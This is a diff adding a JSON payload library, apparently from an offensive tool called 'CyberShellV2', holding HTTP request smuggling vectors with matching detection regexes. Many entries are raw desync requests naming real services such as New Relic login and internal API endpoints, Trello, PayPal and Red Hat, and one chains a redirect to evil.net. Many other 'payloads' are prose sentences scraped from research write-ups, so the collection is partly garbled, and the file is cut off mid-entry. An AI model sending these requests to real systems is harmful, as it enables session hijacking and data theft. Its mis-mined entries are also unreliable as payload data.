@@ -1,0 +1,779 @@
+{
+  "description": "Custom payloads mined from user-provided files",
+  "author": "CyberShellV2",
+  "version": "1.0.0",
+  "generated_at": "2025-08-24T04:06:07.361175Z",
+  "payloads": [
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING 10 =x&cr={creative}&x= 66 POST /index.ph [38932ef5]",
+      "payload": "10\n=x&cr={creative}&x=\n66\nPOST /index.php HTTP/1.1\nHost: saas-app.com\nContent-Length: 200",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "10\\\n=x\\&cr=\\{creative\\}\\&x=\\\n66\\\nPOST\\ /index\\.php\\ HTTP/1\\.1\\\nHost:\\ saas\\-app\\.com\\\nContent\\-Length:\\ 200",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING 5c GPOST / HTTP/1.1 Content-Type: applic [af8e3c20]",
+      "payload": "5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "5c\\\nGPOST\\ /\\ HTTP/1\\.1\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 15\\\nx=1\\\n0",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING 96 GET /404 HTTP/1.1 X: x=1&q=smugging&x [333580d8]",
+      "payload": "96\nGET /404 HTTP/1.1\nX: x=1&q=smugging&x=\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 100",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "96\\\nGET\\ /404\\ HTTP/1\\.1\\\nX:\\ x=1\\&q=smugging\\&x=\\\nHost:\\ example\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 100",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING 9f PUT /1/members/1234 HTTP/1.1 Host: tr [f3420078]",
+      "payload": "9f\nPUT /1/members/1234 HTTP/1.1\nHost: trello.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 400",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "9f\\\nPUT\\ /1/members/1234\\ HTTP/1\\.1\\\nHost:\\ trello\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 400",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING <input id=\"email\" value=\"asdfPOST /login [49abd24a]",
+      "payload": "<input id=\"email\" value=\"asdfPOST /login HTTP/1.1\nHost: login.newrelic.com\nX-Forwarded-For: 81.139.39.150\nX-Forwarded-Proto: https\nX-TLS-Bits: 128\nX-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256\nX-TLS-Version: TLSv1.2\nx-nr-external-service: external \nBy incrementing the Content-Length header you can gradually retrieve more information, until you try to read beyond the end of the victim request and it times out.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "<input\\ id=\"email\"\\ value=\"asdfPOST\\ /login\\ HTTP/1\\.1\\\nHost:\\ login\\.newrelic\\.com\\\nX\\-Forwarded\\-For:\\ 81\\.139\\.39\\.150\\\nX\\-Forwarded\\-Proto:\\ https\\\nX\\-TLS\\-Bits:\\ 128\\\nX\\-TLS\\-Cipher:\\ ECDHE\\-RSA\\-AES128\\-GCM\\-SHA256\\\nX\\-TLS\\-Version:\\ TLSv1\\.2\\\nx\\-nr\\-external\\-service:\\ external\\ \\\nBy\\ incrementing\\ the\\ Content\\-Length\\ header\\ you\\ can\\ gradually\\ retrieve\\ more\\ information,\\ until\\ you\\ try\\ to\\ read\\ beyond\\ the\\ end\\ of\\ the\\ victim\\ request\\ and\\ it\\ times\\ out\\.",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING GPOST / HTTP/1.1 Host: example.com We ha [98f5a407]",
+      "payload": "GPOST / HTTP/1.1\nHost: example.com\nWe haven't made any effort to hide the Transfer-Encoding header here, so this exploit will primarily work on systems where the front-end simply doesn't support chunked encoding - a behaviour seen on many websites using the content delivery network Akamai. Update: Akamai deployed a fix roughly 48 hours after this post was published, although no public advisory has been issued.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "GPOST\\ /\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nWe\\ haven't\\ made\\ any\\ effort\\ to\\ hide\\ the\\ Transfer\\-Encoding\\ header\\ here,\\ so\\ this\\ exploit\\ will\\ primarily\\ work\\ on\\ systems\\ where\\ the\\ front\\-end\\ simply\\ doesn't\\ support\\ chunked\\ encoding\\ \\-\\ a\\ behaviour\\ seen\\ on\\ many\\ websites\\ using\\ the\\ content\\ delivery\\ network\\ Akamai\\.\\ Update:\\ Akamai\\ deployed\\ a\\ fix\\ roughly\\ 48\\ hours\\ after\\ this\\ post\\ was\\ published,\\ although\\ no\\ public\\ advisory\\ has\\ been\\ issued\\.",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING If a message is received with both a Tra [914ac403]",
+      "payload": "If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "If\\ a\\ message\\ is\\ received\\ with\\ both\\ a\\ Transfer\\-Encoding\\ header\\ field\\ and\\ a\\ Content\\-Length\\ header\\ field,\\ the\\ latter\\ MUST\\ be\\ ignored\\.",
+      "tags": [
+        "te.cl"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: domain.example.com [b912d4f2]",
+      "payload": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ domain\\.example\\.com\\\nConnection:\\ keep\\-alive\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 6\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: domain.example.com [0936a1fd]",
+      "payload": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ domain\\.example\\.com\\\nUser\\-Agent:\\ Mozilla/5\\.0\\ \\(X11;\\ Linux\\ x86_64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/73\\.0\\.3683\\.86\\\nContent\\-Length:\\ 4\\\nConnection:\\ close\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nAccept\\-Encoding:\\ gzip,\\ deflate",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: example.com Conten [6c18e70a]",
+      "payload": "POST / HTTP/1.1\nHost: example.com\nContent-Length: 3\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nContent\\-Length:\\ 3\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: example.com Conten [1e7bdf10]",
+      "payload": "POST / HTTP/1.1\nHost: example.com\nContent-Length: 6\nContent-Length: 5",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nContent\\-Length:\\ 6\\\nContent\\-Length:\\ 5",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: example.com Conten [b10639db]",
+      "payload": "POST / HTTP/1.1\nHost: example.com\nContent-Length: 6\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nContent\\-Length:\\ 6\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: example.com This t [6d827cab]",
+      "payload": "POST / HTTP/1.1\nHost: example.com\nThis technique works on quite a few systems, but we can exploit many more by making the Transfer-Encoding header slightly harder to spot, so that one system doesn't see it. This can be achieved using discrepancies in servers' HTTP parsing. Here's a few examples of requests where only some servers recognise the Transfer-Encoding: chunked header. Each of these has been successfully used to exploit at least one system during this research:",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nThis\\ technique\\ works\\ on\\ quite\\ a\\ few\\ systems,\\ but\\ we\\ can\\ exploit\\ many\\ more\\ by\\ making\\ the\\ Transfer\\-Encoding\\ header\\ slightly\\ harder\\ to\\ spot,\\ so\\ that\\ one\\ system\\ doesn't\\ see\\ it\\.\\ This\\ can\\ be\\ achieved\\ using\\ discrepancies\\ in\\ servers'\\ HTTP\\ parsing\\.\\ Here's\\ a\\ few\\ examples\\ of\\ requests\\ where\\ only\\ some\\ servers\\ recognise\\ the\\ Transfer\\-Encoding:\\ chunked\\ header\\.\\ Each\\ of\\ these\\ has\\ been\\ successfully\\ used\\ to\\ exploit\\ at\\ least\\ one\\ system\\ during\\ this\\ research:",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: login.newrelic.com [23dd4f58]",
+      "payload": "POST / HTTP/1.1\nHost: login.newrelic.com\nContent-Length: 142\nTransfer-Encoding: chunked\nTransfer-Encoding: x",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ login\\.newrelic\\.com\\\nContent\\-Length:\\ 142\\\nTransfer\\-Encoding:\\ chunked\\\nTransfer\\-Encoding:\\ x",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: saas-app.com Conte [cd1f2fbe]",
+      "payload": "POST / HTTP/1.1\nHost: saas-app.com\nContent-Length: 4\nTransfer-Encoding : chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ saas\\-app\\.com\\\nContent\\-Length:\\ 4\\\nTransfer\\-Encoding\\ :\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: vulnerable-website [2b484701]",
+      "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ vulnerable\\-website\\.com\\\nContent\\-Length:\\ 13\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: vulnerable-website [70b923b6]",
+      "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ vulnerable\\-website\\.com\\\nContent\\-Length:\\ 3\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Host: www.example.com Co [cfac1e0c]",
+      "payload": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nHost:\\ www\\.example\\.com\\\nContent\\-Length:\\ 37",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST / HTTP/1.1 Transfer-Encoding: blah [ec5dabd6]",
+      "payload": "POST / HTTP/1.1\nTransfer-Encoding: blah",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /\\ HTTP/1\\.1\\\nTransfer\\-Encoding:\\ blah",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /1/cards HTTP/1.1 Host: trello.com  [56f2fa3f]",
+      "payload": "POST /1/cards HTTP/1.1\nHost: trello.com\nTransfer-Encoding:[tab]chunked\nContent-Length: 4",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /1/cards\\ HTTP/1\\.1\\\nHost:\\ trello\\.com\\\nTransfer\\-Encoding:\\[tab\\]chunked\\\nContent\\-Length:\\ 4",
+      "tags": [
+        "te.cl"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /about HTTP/1.1 Host: example.com T [c0ae8090]",
+      "payload": "POST /about HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 4",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /about\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nTransfer\\-Encoding:\\ chunked\\\nContent\\-Length:\\ 4",
+      "tags": [
+        "te.cl",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /about HTTP/1.1 Host: example.com T [db34edd9]",
+      "payload": "POST /about HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 6",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /about\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nTransfer\\-Encoding:\\ chunked\\\nContent\\-Length:\\ 6",
+      "tags": [
+        "te.cl",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /cow.jpg HTTP/1.1 Host: redacted.co [50192beb]",
+      "payload": "POST /cow.jpg HTTP/1.1\nHost: redacted.com \nContent-Type: application/x-www-form-urlencoded \nContent-Length: 50 \nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /cow\\.jpg\\ HTTP/1\\.1\\\nHost:\\ redacted\\.com\\ \\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\ \\\nContent\\-Length:\\ 50\\ \\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /css/style.css HTTP/1.1 Host: www.r [b90c0fbf]",
+      "payload": "POST /css/style.css HTTP/1.1\nHost: www.redhat.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 122\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /css/style\\.css\\ HTTP/1\\.1\\\nHost:\\ www\\.redhat\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 122\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /etc/libs/xyz.js HTTP/1.1 Host: red [fa56de33]",
+      "payload": "POST /etc/libs/xyz.js HTTP/1.1\nHost: redacted\nContent-Length: 57\nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /etc/libs/xyz\\.js\\ HTTP/1\\.1\\\nHost:\\ redacted\\\nContent\\-Length:\\ 57\\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /internal_api/934454/session HTTP/1 [1eb63f3e]",
+      "payload": "POST /internal_api/934454/session HTTP/1.1\nHost: alerts.newrelic.com\nX-Forwarded-Proto: https\nService-Gateway-Account-Id: 934454\nService-Gateway-Is-Newrelic-Admin: true\nContent-Length: 6\n\u2026\nx=123GET...",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /internal_api/934454/session\\ HTTP/1\\.1\\\nHost:\\ alerts\\.newrelic\\.com\\\nX\\-Forwarded\\-Proto:\\ https\\\nService\\-Gateway\\-Account\\-Id:\\ 934454\\\nService\\-Gateway\\-Is\\-Newrelic\\-Admin:\\ true\\\nContent\\-Length:\\ 6\\\n\u2026\\\nx=123GET\\.\\.\\.",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /login HTTP/1.1 Host: login.newreli [0c5f4755]",
+      "payload": "POST /login HTTP/1.1\nHost: login.newrelic.com\nContent-Length: 564\nTransfer-Encoding: chunked\nTransfer-encoding: cow",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /login\\ HTTP/1\\.1\\\nHost:\\ login\\.newrelic\\.com\\\nContent\\-Length:\\ 564\\\nTransfer\\-Encoding:\\ chunked\\\nTransfer\\-encoding:\\ cow",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /login HTTP/1.1 Host: login.newreli [efdbb5bf]",
+      "payload": "POST /login HTTP/1.1\nHost: login.newrelic.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 100\n\u2026\nlogin[email]=asdfPOST /login HTTP/1.1\nHost: login.newrelic.com\nThe green request will be rewritten by the front-end before it lands in the login[email] parameter, so when it gets reflected back it'll leak all the internal headers:",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /login\\ HTTP/1\\.1\\\nHost:\\ login\\.newrelic\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 100\\\n\u2026\\\nlogin\\[email\\]=asdfPOST\\ /login\\ HTTP/1\\.1\\\nHost:\\ login\\.newrelic\\.com\\\nThe\\ green\\ request\\ will\\ be\\ rewritten\\ by\\ the\\ front\\-end\\ before\\ it\\ lands\\ in\\ the\\ login\\[email\\]\\ parameter,\\ so\\ when\\ it\\ gets\\ reflected\\ back\\ it'll\\ leak\\ all\\ the\\ internal\\ headers:",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /search HTTP/1.1 Host: example.com  [d5245f3d]",
+      "payload": "POST /search HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /search\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 11",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /search HTTP/1.1 Host: example.com  [aba082d2]",
+      "payload": "POST /search HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 4\nTransfer-Encoding: zchunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /search\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 4\\\nTransfer\\-Encoding:\\ zchunked",
+      "tags": [
+        "cl.te"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /search HTTP/1.1 Host: example.com  [91aadcfa]",
+      "payload": "POST /search HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 53\nTransfer-Encoding: zchunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /search\\ HTTP/1\\.1\\\nHost:\\ example\\.com\\\nContent\\-Type:\\ application/x\\-www\\-form\\-urlencoded\\\nContent\\-Length:\\ 53\\\nTransfer\\-Encoding:\\ zchunked",
+      "tags": [
+        "cl.te"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /search?dest=../assets/idx?redir=// [668d69d2]",
+      "payload": "POST /search?dest=../assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1\nHost: www.redhat.com\nContent-Length: 15",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /search\\?dest=\\.\\./assets/idx\\?redir=//redhat\\.com@evil\\.net/\\ HTTP/1\\.1\\\nHost:\\ www\\.redhat\\.com\\\nContent\\-Length:\\ 15",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING POST /webstatic/r/fb/fb-all-prod.pp2.min [d3671597]",
+      "payload": "POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 \nHost: c.paypal.com\nContent-Length: 61 \nTransfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "POST\\ /webstatic/r/fb/fb\\-all\\-prod\\.pp2\\.min\\.js\\ HTTP/1\\.1\\ \\\nHost:\\ c\\.paypal\\.com\\\nContent\\-Length:\\ 61\\ \\\nTransfer\\-Encoding:\\ chunked",
+      "tags": [
+        "cl.te",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING PayPal speedily resolved this vulnerabil [cdccd48a]",
+      "payload": "PayPal speedily resolved this vulnerability by configuring Akamai to reject requests that contained a Transfer-Encoding: chunked header, and awarded a $18,900 bounty.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "PayPal\\ speedily\\ resolved\\ this\\ vulnerability\\ by\\ configuring\\ Akamai\\ to\\ reject\\ requests\\ that\\ contained\\ a\\ Transfer\\-Encoding:\\ chunked\\ header,\\ and\\ awarded\\ a\\ \\$18,900\\ bounty\\.",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING The front-end and back-end servers both  [5883745e]",
+      "payload": "The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "The\\ front\\-end\\ and\\ back\\-end\\ servers\\ both\\ support\\ the\\ Transfer\\-Encoding\\ header,\\ but\\ one\\ of\\ the\\ servers\\ can\\ be\\ induced\\ not\\ to\\ process\\ it\\ by\\ obfuscating\\ the\\ header\\ in\\ some\\ way\\.",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING The front-end server uses the Content-Le [c6cfba65]",
+      "payload": "The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "The\\ front\\-end\\ server\\ uses\\ the\\ Content\\-Length\\ header\\ and\\ the\\ back\\-end\\ server\\ uses\\ the\\ Transfer\\-Encoding\\ header\\.",
+      "tags": [
+        "cl.te"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING The front-end server uses the Transfer-E [e1468e86]",
+      "payload": "The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.",
+      "description": "HTTP request desynchronization / smuggling vector",
